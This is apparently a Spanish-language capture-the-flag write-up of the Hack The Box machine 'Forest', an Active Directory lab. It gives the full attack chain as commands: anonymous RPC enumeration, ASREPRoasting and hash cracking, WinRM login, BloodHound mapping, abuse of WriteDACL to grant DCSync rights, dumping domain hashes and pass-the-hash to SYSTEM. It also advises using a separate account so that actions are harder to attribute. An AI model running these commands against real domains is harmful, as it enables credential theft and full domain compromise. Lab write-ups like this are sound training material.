[🌲 Forest — HTB [Windows · Easy · AD] 36c15bd2d16c81528c9cc5288cf5a540.md](https://github.com/user-attachments/files/28308028/Forest.HTB.Windows.Easy.AD.36c15bd2d16c81528c9cc5288cf5a540.md)
# 🌲 Forest — HTB [Windows · Easy · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.95.210` |
| Dominio | `htb.local` |
| Vector inicial | RPC anónimo → enumeración de usuarios → ASREPRoasting |
| Usuario inicial | `svc-alfresco` : `s3rvice` |
| Foothold | evil-winrm como svc-alfresco |
| Escalada | WriteDACL (Exchange Windows Permissions) → usuario levi → DCSync → hash Administrator |
| Root | `nt authority\system` vía impacket-psexec con hash NTLM |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Escaner completo para ver qué superficie tenemos. El resultado es el perfil clásico de un DC: DNS, Kerberos, RPC, LDAP, SMB, WinRM. Con 5985 abierto ya sabemos que si conseguimos credenciales tenemos shell directa.

```bash
nmap -sS -p- --min-rate 5000 10.129.95.210
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image.png)
> 

## Nmap — versiones y scripts

Confirmamos el nombre del dominio, versión del SO y que SMB signing está habilitado. El hostname es `FOREST`, dominio `htb.local`, Windows Server 2016 Standard.

```bash
nmap -sV -sC -p 53,88,135,139,389,445,636,3268,5985 10.129.95.210
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image1.png)
> 

---

# 2. Enumeración

## RPC anónimo — usuarios y grupos

SMB requiere firma y no tiene acceso anónimo, pero RPC sí responde sin credenciales. Con `rpcclient` podemos volcar toda la información del dominio: usuarios, grupos, políticas.

```bash
rpcclient -U '' -N 10.129.95.210
rpcclient $> enumdomusers
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image2.png)
> 

```bash
rpcclient $> enumdomgroups
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image3.png)

De toda la lista, `svc-alfresco` destaca — es una cuenta de servicio, y las cuentas de servicio a veces tienen Kerberos pre-auth deshabilitado para compatibilidad con aplicaciones legacy. Eso significa ASREPRoast posible.

---

# 3. Explotación — ASREPRoasting

Con la lista de usuarios intentamos ASREPRoasting vía LDAP con contraseña nula. El ataque funciona contra cuentas que tienen `DONT_REQ_PREAUTH` activado — el KDC responde con un AS-REP cifrado con la clave del usuario, que podemos crackear offline.

```bash
nxc ldap 10.129.95.210 -u users.txt -p '' --asreproast output.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image4.png)
> 

Con el hash en mano lo crackeamos con hashcat modo 18200 (Kerberos 5 AS-REP):

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image5.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image6.png)
> 

---

# 4. Acceso inicial — evil-winrm

Con `svc-alfresco:s3rvice` y el puerto 5985 abierto, entramos directamente:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image7.png)
> 

---

# 5. Escalada — WriteDACL → DCSync

## BloodHound — mapear el dominio

Subimos SharpHound para recopilar toda la información del AD y encontrar rutas de ataque:

```powershell
*Evil-WinRM* PS> upload SharpHound.exe
*Evil-WinRM* PS> .\SharpHound.exe
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image8.png)
> 

Cargamos el zip en BloodHound y analizamos el grafo:

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image9.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image10.png)
> 

El hallazgo clave: `Exchange Windows Permissions` tiene **WriteDACL** sobre el objeto del dominio `DC=htb,DC=local`. Con WriteDACL podemos escribir ACEs arbitrarios — incluyendo darnos a nosotros mismos los derechos de replicación (DCSync).

`svc-alfresco` llega a ese grupo a través de la cadena: Service Accounts → Privileged IT Accounts → Account Operators → Exchange Windows Permissions.

## Crear usuario operario y añadirlo a grupos

En lugar de usar `svc-alfresco` directamente (para no levantar alertas con cambios en la cuenta de servicio), creamos un usuario nuevo y le damos los grupos necesarios:

```powershell
# Crear usuario
net user levi Password123! /add /domain

# Añadir a Exchange Windows Permissions (para WriteDACL sobre el dominio)
net group "Exchange Windows Permissions" levi /add

# Añadir a Remote Management Users (para evil-winrm si hace falta)
net localgroup "Remote Management users" levi /add
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image11.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image12.png)

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image13.png)
> 

## DCSync — volcar hashes del dominio

Con levi ya teniendo derechos de replicación, usamos impacket-secretsdump desde nuestra máquina para pedir al DC todos los secretos del dominio:

```bash
impacket-secretsdump htb/levi@10.129.28.204
# Password: Password123!
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image14.png)

## Pass-the-Hash → SYSTEM

Con el hash NTLM del Administrator hacemos pass-the-hash con psexec:

```bash
impacket-psexec administrator@10.129.28.204 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image15.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Forest/assets/image16.png)

---

# 6. Cadena de ataque

```
RPC anónimo → enumdomusers → svc-alfresco identificado
    ↓
nxc ldap --asreproast → $krb5asrep hash de svc-alfresco
    ↓
hashcat -m 18200 → svc-alfresco:s3rvice
    ↓
evil-winrm → shell como svc-alfresco → user.txt
    ↓
SharpHound + BloodHound → svc-alfresco → Exchange Windows Permissions → WriteDACL sobre HTB.LOCAL
    ↓
net user levi + net group Exchange Windows Permissions
    ↓
PowerView Add-ObjectACL → levi con derechos DCSync
    ↓
impacket-secretsdump → hash NTLM Administrator
    ↓
impacket-psexec -hashes → nt authority\system → root.txt
```

---

# 7. Moralejas

## RPC anónimo es una fuente de reconocimiento brutal en AD

Cuando SMB no da acceso anónimo, RPC muchas veces sí. `rpcclient -U '' -N` contra un DC es reflejo automático — `enumdomusers` y `enumdomgroups` te dan la foto completa del dominio sin una sola credencial. En un entorno real esto es información que un atacante no debería poder obtener sin autenticación, pero en entornos legacy o mal configurados es habitual.

## Las cuentas de servicio son el primer objetivo de ASREPRoast

Cualquier cuenta con `DONT_REQ_PREAUTH` es vulnerable aunque la contraseña sea fuerte — si está en rockyou, se cae. El patrón: consigues lista de usuarios por RPC/LDAP → tiras nxc o GetNPUsers contra todos → si hay alguna cuenta sin pre-auth, tienes un hash crackeable offline sin hacer ruido. `svc-alfresco` es exactamente el perfil de cuenta que suele tener ese flag activado.

## Exchange en AD es un vector de escalada clásico

Los grupos de Exchange (especialmente `Exchange Windows Permissions`) heredan permisos sobre el objeto del dominio que son demasiado amplios. Es un problema conocido y documentado — el write-up de [dirkjanm.io](http://dirkjanm.io) sobre esto es referencia. Siempre que veas grupos de Exchange en BloodHound, mira sus edges sobre el dominio.

## WriteDACL sobre el dominio = DCSync garantizado

WriteDACL te permite escribir cualquier ACE. El flujo para convertirlo en DCSync es siempre el mismo: PowerView `Add-ObjectACL -Rights DCSync` → impacket-secretsdump. No hace falta escalar a Domain Admin primero — los derechos de replicación son suficientes para volcar todos los hashes.

## Crear un usuario intermedio es buena práctica operacional

Usar directamente `svc-alfresco` para modificar ACLs del dominio generaría logs asociados a esa cuenta de servicio, que debería tener un comportamiento predecible y monitoreado. Crear un usuario limpio (`levi`) para las acciones destructivas/ruidosas es más ordenado y, en un ejercicio real, más difícil de atribuir inmediatamente.

## El patrón OSCP de esta máquina

```
RPC anónimo → enumeración sin credenciales
    ↓
ASREPRoast → cuenta de servicio con pre-auth deshabilitado
    ↓
BloodHound → ACL abuse (WriteDACL → DCSync)
    ↓
Pass-the-Hash → SYSTEM
```

Este es uno de los caminos AD más clásicos del OSCP. La cadena RPC anónimo → ASREPRoast → ACL abuse aparece en variantes en casi todos los sets de AD.

---

# 8. Conceptos técnicos clave

**ASREPRoasting:** Ataque contra cuentas Kerberos que tienen deshabilitada la pre-autenticación (`DONT_REQ_PREAUTH`). El KDC responde con un AS-REP cifrado con la clave del usuario sin verificar identidad — ese cifrado es crackeable offline con hashcat modo 18200.

**WriteDACL:** Permiso que permite escribir entradas en la DACL (Discretionary Access Control List) de un objeto AD. Con WriteDACL sobre el objeto del dominio puedes añadir cualquier ACE — incluyendo los derechos de replicación `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` que constituyen DCSync.

**DCSync:** Técnica que simula el comportamiento de un Domain Controller pidiendo replicación de credenciales al DC real. Usa el protocolo MS-DRSR. No requiere ejecutar código en el DC — se hace desde la red con las credenciales de una cuenta que tenga derechos de replicación.

**Pass-the-Hash:** Autenticación NTLM usando el hash directamente en lugar de la contraseña en texto claro. impacket-psexec acepta `-hashes LM:NT` y autentica contra el servicio SMB del objetivo.

---

# 9. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.95.210
nmap -sV -sC -p 53,88,135,139,389,445,636,3268,5985 10.129.95.210

# Enumeración RPC anónima
rpcclient -U '' -N 10.129.95.210
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# ASREPRoasting
nxc ldap 10.129.95.210 -u users.txt -p '' --asreproast output.txt
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt

# Acceso inicial
evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'

# BloodHound
# upload SharpHound.exe desde evil-winrm
# .\SharpHound.exe → download zip → cargar en BloodHound

# Escalada — crear usuario y darle grupos
net user levi Password123! /add /domain
net group "Exchange Windows Permissions" levi /add
net localgroup "Remote Management users" levi /add

# PowerView — DCSync rights
. .\PowerView.ps1
$pass = convertto-securestring 'Password123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\levi', $pass)
Add-ObjectACL -PrincipalIdentity levi -Credential $cred -Rights DCSync

# DCSync
impacket-secretsdump htb/levi@10.129.28.204

# Pass-the-Hash → SYSTEM
impacket-psexec administrator@10.129.28.204 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
